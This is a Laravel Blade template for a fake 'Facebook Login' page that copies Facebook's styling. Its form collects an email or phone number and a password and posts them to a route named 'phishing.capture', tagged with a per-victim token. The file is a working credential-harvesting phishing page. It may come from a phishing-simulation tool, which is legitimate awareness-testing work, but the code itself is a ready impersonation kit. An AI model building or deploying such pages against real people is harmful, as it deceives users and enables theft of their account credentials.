<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 300px;
            margin: auto;
            margin-top: 100px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-radius: 8px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 5px 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 95%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Facebook</h2>
        <form action="{{ route('phishing.capture', ['template' => 'facebook', 'token' => $token]) }}" method="POST">
            @csrf
            <input type="text" name="email" placeholder="Email or Phone Number" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
